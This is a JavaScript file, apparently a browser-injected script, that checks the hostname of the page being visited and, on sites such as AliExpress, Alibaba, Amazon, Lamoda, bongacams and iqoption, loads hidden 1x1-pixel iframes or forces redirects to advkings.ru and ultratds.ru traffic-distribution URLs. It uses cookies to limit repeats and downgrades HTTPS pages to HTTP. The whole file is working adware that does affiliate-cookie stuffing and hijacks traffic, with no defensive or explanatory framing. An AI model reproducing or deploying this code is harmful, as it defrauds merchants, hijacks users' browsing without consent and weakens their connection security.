function parseURL(url) {
    var parser = document.createElement('a'),
        searchObject = {},
        queries, split, i;

    parser.href = url;
    queries = parser.search.replace(/^\?/, '').split('&');
    for( i = 0; i < queries.length; i++ ) {
        split = queries[i].split('=');
        searchObject[split[0]] = split[1];
    }
    return {
        protocol: parser.protocol,
        host: parser.host,
        hostname: parser.hostname,
        port: parser.port,
        pathname: parser.pathname,
        search: parser.search,
        searchObject: searchObject,
        hash: parser.hash
    };
}
var url = parseURL(document.location.href);
var amaz = url.hostname;
var proto = url.protocol;
function getcookie(a) {var b = new RegExp(a+'=([^;]){1,}');var c = b.exec(document.cookie);if(c) c = c[0].split('=');else return false;return c[1] ? c[1] : false;}
/*if(amaz.indexOf('ebay')<0 && amaz.indexOf('amazon')<0){
	var block = getcookie( "lolIkat" );
	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 3600 * 24 * 1000);
		document.cookie = "lolIkat=lordi; expires=" + now.toUTCString() + "; path=/";
		var el = document.createElement("iframe");
		var elnew = document.createElement("iframe");
		elnew.id = 'ifrmSaduga';
		elnew.style.width = "1px";
		elnew.style.height = "1px";
		elnew.src = 'http://oji-new.ru/store';
		document.body.appendChild(elnew);	
	}
}
*/


if(amaz.indexOf('aliexpress')>=0){

	var block = getcookie( "freksad3" );
	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 1 * 2900 * 1000);
		var el = document.createElement("iframe");
		el.id = 'iframe';
		el.style.width = "1px";
		el.style.height = "1px";
		
		if(proto.indexOf('http:')>=0){
			el.src = '//advkings.ru/tds/go.php?sid=39';
			document.cookie = "freksad3=lordi; expires=" + now.toUTCString() + "; path=/";
		}else{
			var block2 = getcookie( "alik" );
			if(block2!="glom"){
				var now2 = new Date();
				now2.setTime(now2.getTime() + 1 * 2900 * 1000);
				document.cookie = "alik=glom; expires=" + now2.toUTCString() + "; path=/";
				var url2 = document.location.href.replace("https:","http:");
				window.location.href = url2;
			}
		}
		document.body.appendChild(el);
	}
}else if(amaz.indexOf('alibaba')>=0){
	var block = getcookie( "fraalib" );

	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 1 * 2900 * 1000);
		var el = document.createElement("iframe");
		el.id = 'iframe';
		el.style.width = "1px";
		el.style.height = "1px";
		if(proto.indexOf('http:')>=0){
			el.src = '//advkings.ru/tds/go.php?sid=61';
			document.cookie = "fraalib=lordi; expires=" + now.toUTCString() + "; path=/";
		}else{
			var block2 = getcookie( "aliba" );
			if(block2!="glom"){
				var now2 = new Date();
				now2.setTime(now2.getTime() + 1 * 2900 * 1000);
				document.cookie = "aliba=glom; expires=" + now2.toUTCString() + "; path=/";
				var url2 = document.location.href.replace("https:","http:");
				window.location.href = url2;
			}
		}
		document.body.appendChild(el);
	}
}
else if(amaz.indexOf('.amazon.')>=0){
	var block = getcookie( "frqksad" );
	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 1 * 1500 * 1000);
		document.cookie = "frqksad=lordi; expires=" + now.toUTCString() + "; path=/";
		var el = document.createElement("iframe");
		el.id = 'iframe';
		el.style.width = "1px";
		el.style.height = "1px";
		el.src = '//advkings.ru/store/statist.php';
		document.body.appendChild(el);
	}
}else if(amaz.indexOf('banggood')>=0){
	var block = getcookie( "frqabang" );
	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 1 * 9400 * 1000);
		document.cookie = "frqabang=lordi; expires=" + now.toUTCString() + "; path=/";
		var el = document.createElement("iframe");
		el.id = 'iframe';
		el.style.width = "1px";
		el.style.height = "1px";
		el.src = 'http://advkings.ru/tds/go.php?sid=49';
		document.body.appendChild(el);
	}
}else if(amaz.indexOf('tutu.ru')>=0){

	var block = getcookie( "frqatutu" );
	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 1 * 9400 * 1000);
		document.cookie = "frqatutu=lordi; expires=" + now.toUTCString() + "; path=/";
		var el = document.createElement("iframe");
		el.id = 'iframe';
		el.style.width = "1px";
		el.style.height = "1px";
		el.src = 'http://advkings.ru/tds/go.php?sid=50';
		document.body.appendChild(el);
	}
}else if(amaz.indexOf('gearbest')>=0){
	
	var block = getcookie( "frgearbest" );
	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 1 * 9400 * 1000);
		document.cookie = "frgearbest=lordi; expires=" + now.toUTCString() + "; path=/";
				var el = document.createElement("iframe");
		el.id = 'iframe';
		el.style.width = "1px";
		el.style.height = "1px";
		el.src = 'http://advkings.ru/tds/go.php?sid=48';
		document.body.appendChild(el);
	}
}else if(amaz.indexOf('letyshops.ru')>=0){
	
	var block = getcookie( "frqletty" );
	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 1 * 9400 * 1000);
		document.cookie = "frqletty=lordi; expires=" + now.toUTCString() + "; path=/";
						var el = document.createElement("iframe");
		el.id = 'iframe';
		el.style.width = "1px";
		el.style.height = "1px";
		el.src = 'https://advkings.ru/tds/go.php?sid=52';
		document.body.appendChild(el);
	}
}else if(amaz.indexOf('bongacams')>=0){
	
	var block = getcookie( "frqaibong" );
	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 1 * 9400 * 1000);
		document.cookie = "frqaibong=lordi; expires=" + now.toUTCString() + "; path=/";
		window.location.href = "//advkings.ru/tds/go.php?sid=54";
	}
}else if(amaz.indexOf('kismia.com')>=0){
	
	var block = getcookie( "frkismia" );
	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 1 * 9400 * 1000);
		document.cookie = "frkismia=lordi; expires=" + now.toUTCString() + "; path=/";
		window.location.href = "//advkings.ru/tds/go.php?sid=55";
	}
}else if(amaz.indexOf('ivideon')>=0){
	
	var block = getcookie( "frivi" );
	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 1 * 9400 * 1000);
		document.cookie = "frivi=lordi; expires=" + now.toUTCString() + "; path=/";
		var el = document.createElement("iframe");
		el.id = 'iframe';
		el.style.width = "1px";
		el.style.height = "1px";
		el.src = 'https://advkings.ru/tds/go.php?sid=30';
		document.body.appendChild(el);
	}
}else if(amaz.indexOf('pleer.ru')>=0){
	
	var block = getcookie( "frpleer" );
	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 1 * 9400 * 1000);
		document.cookie = "frpleer=lordi; expires=" + now.toUTCString() + "; path=/";
		var el = document.createElement("iframe");
		el.id = 'iframe';
		el.style.width = "1px";
		el.style.height = "1px";
		el.src = 'http://advkings.ru/tds/go.php?sid=31';
		document.body.appendChild(el);
	}
}else if(amaz.indexOf('Aviasales')>=0){
	
	var block = getcookie( "fravia" );
	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 1 * 9400 * 1000);
		document.cookie = "fravia=lordi; expires=" + now.toUTCString() + "; path=/";
				var el = document.createElement("iframe");
		el.id = 'iframe';
		el.style.width = "1px";
		el.style.height = "1px";
		el.src = 'https://advkings.ru/tds/go.php?sid=29';
		document.body.appendChild(el);
	}
}else if(amaz.indexOf('akusherstvo')>=0){
	
	var block = getcookie( "frakush" );
	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 1 * 9400 * 1000);
		document.cookie = "frakush=lordi; expires=" + now.toUTCString() + "; path=/";
						var el = document.createElement("iframe");
		el.id = 'iframe';
		el.style.width = "1px";
		el.style.height = "1px";
		el.src = 'http://advkings.ru/tds/go.php?sid=32';
		document.body.appendChild(el);
	}
}else if(amaz.indexOf('lamoda')>=0){
	
	var block = getcookie( "frlamod" );
	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 1 * 9400 * 1000);
		document.cookie = "frlamod=lordi; expires=" + now.toUTCString() + "; path=/";
								var el = document.createElement("iframe");
		el.id = 'iframe';
		el.style.width = "1px";
		el.style.height = "1px";
		el.src = 'http://advkings.ru/tds/go.php?sid=33';
		document.body.appendChild(el);
	}
}else if(amaz.indexOf('iqoption')>=0){

	var block = getcookie( "friqopt" );
	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 7*24*60*60*1000);
		document.cookie = "friqopt=lordi; expires=" + now.toUTCString() + "; path=/";
		window.location.href = 'https://advkings.ru/tds/go.php?sid=47';
	}
}else if(amaz.indexOf('ozon.travel')>=0){
	
	var block = getcookie( "fravel" );
	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 1 * 7100 * 1000);
		document.cookie = "fravel=lordi; expires=" + now.toUTCString() + "; path=/";
		var el = document.createElement("iframe");
		el.id = 'iframe';
		el.style.width = "1px";
		el.style.height = "1px";
		el.src = '//advkings.ru/tds/go.php?sid=53';
		document.body.appendChild(el);
	}
}else if(amaz.indexOf('mvideo')>=0){
	
	var block = getcookie( "framvid" );
	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 1 * 7100 * 1000);
		document.cookie = "framvid=lordi; expires=" + now.toUTCString() + "; path=/";
		var el = document.createElement("iframe");
		el.id = 'iframe';
		el.style.width = "1px";
		el.style.height = "1px";
		el.src = 'http://advkings.ru/tds/go.php?sid=60';
		document.body.appendChild(el);
	}
}else if(amaz.indexOf('chipdip')>=0){
	
	var block = getcookie( "framchip" );
	if(block!="lordi"){
		var now = new Date();
		now.setTime(now.getTime() + 1 * 7100 * 1000);
		document.cookie = "framchip=lordi; expires=" + now.toUTCString() + "; path=/";
		var el = document.createElement("iframe");
		el.id = 'iframe';
		el.style.width = "1px";
		el.style.height = "1px";
		el.src = 'http://ultratds.ru/brvbHT';
		document.body.appendChild(el);
	}
}

//